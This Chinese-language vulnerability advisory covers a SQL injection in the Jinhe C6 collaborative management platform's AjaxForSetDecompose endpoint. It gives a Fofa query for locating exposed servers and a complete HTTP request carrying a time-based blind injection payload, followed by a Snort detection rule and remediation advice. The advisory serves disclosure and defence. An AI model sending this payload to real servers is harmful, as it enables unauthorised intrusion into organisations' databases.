# 金和C6协同管理平台 AjaxForSetDecompose.aspx SQL注入漏洞

金和C6协同管理平台 AjaxForSetDecompose.aspx SQL注入漏洞

# 影响版本

金和C6协同管理平台

# **漏洞状态**

|**漏洞细节**|**漏洞POC**|**漏洞EXP**|**在野利用**|
| :-: | :-: | :-: | :-: |
|**是**|**已公开**|**已公开**|**已知**|

## 风险等级

|**维度**|**评价**|
| :-: | :-: |
|**威胁等级**|**高危**|
|**影响面**|**广**|
|**攻击者价值**|**高**|
|**利用难度**|**低**|

# 漏洞复现

**Fofa:**  app="金和网络-金和OA" || body="JHSoft.Web.AddMenu"

**POC/EXP：**

**step1 延时注入**

```
POST /c6/JHSoft.Web.CostControl/Decompose/AjaxForSetDecompose.ashx HTTP/1.1
Host: 127.0.0.1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/152.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Upgrade-Insecure-Requests: 1
Content-Type: application/x-www-form-urlencoded

strType=getDetpCollect&strYear=1' waitfor delay '0:0:5' --
```

​![image](assets/image-20260831085307-vexmgbf.png)​

**sonrt规则：**

```
alert tcp any any -> $HOME_NET any (
    msg:"金和C6协同管理平台 - /c6/JHSoft.Web.CostControl/Decompose/AjaxForSetDecompose.ashx SQL注入漏洞 (Time-based Blind)";
    flow:to_server,established;
    http.method; content:"POST";
    http.uri; content:"/c6/JHSoft.Web.CostControl/Decompose/AjaxForSetDecompose.ashx"; fast_pattern;
    http.content_type; content:"application/x-www-form-urlencoded";
    http.request_body; content:"strYear="; nocase;
    http.request_body; pcre:"/WAITFOR\s+DELAY/i";
    metadata:
        service http,
        affected_product "金和C6协同管理平台",
        vulnerability_type "SQL Injection (Time-based)",
        severity "critical";
    classtype:web-application-attack;
    sid:1000743;
    rev:1;
    priority:1;
)
```

# 漏洞修复

1、建议联系厂商打补丁或升级版本。

2、增加Web应用防火墙防护。

3、关闭互联网暴露面或接口设置访问权限。

‍
